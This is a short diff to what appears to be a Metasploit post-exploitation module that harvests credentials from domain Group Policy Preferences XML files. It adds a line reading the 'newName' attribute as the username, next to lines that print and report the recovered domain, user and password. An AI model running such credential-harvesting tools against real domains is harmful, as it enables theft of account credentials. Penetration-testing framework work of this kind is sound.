@@ -174,6 +174,7 @@ class Metasploit3 < Msf::Post
 			user = node.attributes['accountName'] if node.attributes['accountName']
 			user = node.attributes['username'] if  node.attributes['username']
 			user = node.attributes['userName'] if  node.attributes['userName']
+			user = node.attributes['newName'] if  node.attributes['newName']
 
 			print_good "DOMAIN CONTROLLER: #{xmlfile[:dc]} DOMAIN: #{xmlfile[:domain]} USER: #{user} PASS: #{pass} "
 			report_creds(user,pass)
